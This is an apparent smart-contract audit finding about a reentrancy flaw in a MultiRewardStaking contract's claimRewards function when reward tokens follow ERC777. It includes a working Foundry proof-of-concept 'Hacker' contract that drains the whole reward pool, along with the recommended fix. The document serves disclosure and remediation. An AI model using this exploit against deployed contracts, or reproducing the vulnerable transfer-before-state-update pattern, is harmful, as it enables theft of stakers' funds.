# [H] Staking rewards can be drained

## Summary
Severity: High
Contest weight: 0.8265
Dataset id: 18013
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The vulnerability is a reentrancy flaw in the reward‑claiming function of a multi‑reward staking contract that uses ERC777 tokens for reward distribution. The function iterates over a list of reward tokens, reads the accrued amount for a user, and then transfers the tokens before resetting the stored balance. Because ERC777 tokens support a recipient hook (tokensReceived) that can execute arbitrary code during the transfer, a malicious contract can register such a hook and re‑enter the claimRewards function while the original transfer is still in progress. The root cause is the failure to follow the checks‑effects‑interactions pattern: the contract updates the user’s accruedRewards mapping only after the external token transfer, allowing the attacker to invoke claimRewards again and read the same non‑zero balance repeatedly. This can be exploited by a hacker contract that first deposits staking tokens, then calls claimRewards; the ERC777 hook triggers a second call to claimRewards before the first call clears the reward balance, and this loop continues until the staking contract’s reward pool is emptied. The impact is that the entire reward balance held by the staking contract can be drained, effectively stealing funds that were meant to be distributed to legitimate stakers. The condition for exploitation is that at least one reward token follows the ERC777 standard and that the staking contract does not protect the claimRewards function with a reentrancy guard or proper state updates before external calls. Users are affected because they see their expected rewards disappear; from a UI perspective a user may see a “reward claimed” event but later notice that the contract’s reward balance is zero and that no further rewards are available. The issue was discovered during a formal audit by reviewing the claimRewards implementation and confirming that the accruedRewards entry is cleared after the transfer, then reproducing the attack with a test contract that registers an ERC777 hook. The bug is subtle because the transfer succeeds and emits the expected event, so casual testing may not reveal that the balance remains unchanged until after the call, and the reentrancy only manifests with ERC777 tokens, which are less common than ERC20. To remediate, the contract should clear the accruedRewards entry before performing the token transfer (checks‑effects‑interactions) and protect the function with a non‑reentrant modifier such as OpenZeppelin’s ReentrancyGuard. Conceptually, this is a classic reentrancy vulnerability where external calls are made before internal state is updated, allowing an attacker to manipulate accounting logic and drain funds.

## Proof of Concept
ERC777 allow users to register a hook to notify them when tokens are transferred to them.

This hook can be used to reenter the contract and drain the rewards.

The issue is in the `claimRewards` in `MultiRewardStaking`. The function does not follow the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop.   
    
```solidity
  function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {
    for (uint8 i; i < _rewardTokens.length; i++) {
      uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];

      if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);

      EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];

      if (escrowInfo.escrowPercentage > 0) {
        _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);
        emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);
      } else {
        _rewardTokens[i].transfer(user, rewardAmount);
        emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);
      }

      accruedRewards[user][_rewardTokens[i]] = 0;
    }
```

As can be seen above, the clearing of the `accruedRewards` is done AFTER the transfer when it should be BEFORE the transfer.

**Foundry POC**

The POC demonstrates an end-to-end attack including a malicious hacker contract that steals the balance of the reward token.

Add the following file (drainRewards.t.sol) to the test directory:   
    
```solidity
// SPDX-License-Identifier: GPL-3.0
// Docgen-SOLC: 0.8.15

pragma solidity ^0.8.15;

import { Test } from "forge-std/Test.sol";
import { MockERC20 } from "./utils/mocks/MockERC20.sol";
import { IMultiRewardEscrow } from "../src/interfaces/IMultiRewardEscrow.sol";
import { MultiRewardStaking, IERC20 } from "../src/utils/MultiRewardStaking.sol";
import { MultiRewardEscrow } from "../src/utils/MultiRewardEscrow.sol";

import { ERC777 } from "openzeppelin-contracts/token/ERC777/ERC777.sol";

contract MockERC777 is ERC777 {
  uint8 internal _decimals;
  mapping(address => address) private registry;

    constructor() ERC777("MockERC777", "777", new address[](0)) {}

  function decimals() public pure override returns (uint8) {
    return uint8(18);
  }

  function mint(address to, uint256 value) public virtual {
    _mint(to, value, hex'', hex'', false);
  }

  function burn(address from, uint256 value) public virtual {
    _mint(from, value, hex'', hex'');
  }
}

contract Hacker {
    IERC20[] public rewardsTokenKeys;
    MultiRewardStaking staking;
    constructor(IERC20[] memory _rewardsTokenKeys, MultiRewardStaking _staking){
      rewardsTokenKeys = _rewardsTokenKeys;
      staking = _staking;

      // register hook
      bytes32 erc777Hash = keccak256("ERC777TokensRecipient");
      bytes memory data = abi.encodeWithSignature("setInterfaceImplementer(address,bytes32,address)", address(this), erc777Hash, address(this));
      address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).call(data);
    }

    // deposit into staking
    function approveAndDeposit() external {
      IERC20 stakingToken = IERC20(staking.asset());
      stakingToken.approve(address(staking), 1 ether);
      staking.deposit(1 ether);
    }

    function startHack() external {
      // Claim and reenter until staking contract is drained
      staking.claimRewards(address(this), rewardsTokenKeys);
    }
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
      // continue as long as the balance of the reward token is positive
      // In real life, we should check the lower boundry to prevent a revert
      // when trying to send more then the balance.
      if(ERC777(msg.sender).balanceOf(address(staking)) > 0){
        staking.claimRewards(address(this), rewardsTokenKeys);
      }
    }
}

contract DrainRewards is Test {
  MockERC20 stakingToken;
  MockERC777 rewardToken1;
  IERC20 iRewardToken1;
  MultiRewardStaking staking;
  MultiRewardEscrow escrow;

  address feeRecipient = address(0x9999);
  
  function setUp() public {
    stakingToken = new MockERC20("Staking Token", "STKN", 18);
    rewardToken1 = new MockERC777();
    iRewardToken1 = IERC20(address(rewardToken1));
    escrow = new MultiRewardEscrow(address(this), feeRecipient);
    staking = new MultiRewardStaking();
    staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));
  }

  function _addRewardToken(MockERC777 rewardsToken) internal {
    rewardsToken.mint(address(this), 10 ether);
    rewardsToken.approve(address(staking), 10 ether);
    staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);
  }

  function test__claim_reentrancy() public {
    // Prepare array for `claimRewards`
    IERC20[] memory rewardsTokenKeys = new IERC20[](1);
    rewardsTokenKeys[0] = iRewardToken1;

    // setup hacker contract
    Hacker hacker = new Hacker(rewardsTokenKeys, staking);
    address hackerAddr = address(hacker);
    stakingToken.mint(hackerAddr, 1 ether);
    hacker.approveAndDeposit();

    // Add reward token to staking 
    _addRewardToken(rewardToken1);

    // 10% of rewards paid out
    vm.warp(block.timestamp + 10);

    // Get the full rewards held by the staking contract
    uint256 full_rewards_amount = iRewardToken1.balanceOf(address(staking));

    // Call hacker to start claiming the rewards and reenter
    hacker.startHack();

    // validate we received 100% of rewards (10 eth)
    assertEq(rewardToken1.balanceOf(hackerAddr), full_rewards_amount);
  }
}
```

To run the POC, execute the following command:
    
```
forge test -m "test__claim_reentrancy" --fork-url=<MAINNET FORK>
```

Expected results:
    
```
Running 1 test for test/drainRewards.t.sol:DrainRewards
[PASS] test__claim_reentrancy() (gas: 1018771)
Test result: ok. 1 passed; 0 failed; finished in 6.46s
```

## Recommendation
Follow the checks-effects-interactions pattern and clear out `accruedRewards[user][_rewardTokens[i]]` before transferring.

Additionally, it would be a good idea to add a ReentrancyGuard modifier to the function.
